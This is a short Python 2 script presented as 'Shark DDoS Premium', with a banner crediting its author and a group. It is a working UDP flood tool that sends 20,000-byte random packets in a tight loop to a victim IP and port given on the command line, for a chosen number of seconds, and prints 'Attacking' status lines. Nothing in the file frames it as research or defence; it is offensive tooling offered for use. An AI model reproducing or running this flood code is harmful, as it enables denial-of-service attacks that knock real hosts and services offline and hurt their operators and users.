import time
import socket
import random
import sys
def usage():
    print "_________________________________________________________________________________"
    print "------------------------------------Shark-DDOS-Attack------------------------------------------------------------"
    print "------------------------------------------------------------------------------------------------------------------------------"
    print "                 Command Run : " "python2 SharkDoS.py " "<ip> <port> <packet>"
    print "__________________________________________________________________________________"
    print "Coded By : IYoonihXv"
    print "Team : Xv Community"
    print "Shark Attack Version : v1.0"
    print "__________________________________________________________________________________"
    print "================================================================"
    print "__________________________________________________________________________________"
    print "                                      <--[ Shark DDoS Premium ]-->                                                      "
    print "__________________________________________________________________________________"
    print "                                                  Xv Community"
    print "                              Support Me On Youtube IYoonih Dos :/"
    print " __________________________________________________________________________________"
def flood(victim, vport, duration):
    # Don't Leaked This Tools
    # Tools By IYoonihVx
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Run 20000 Packet
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mAttacking By IYoonih \033[1;32m%s \033[1;91mSending Packet \033[1;32m%s \033[1;91mTo Port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()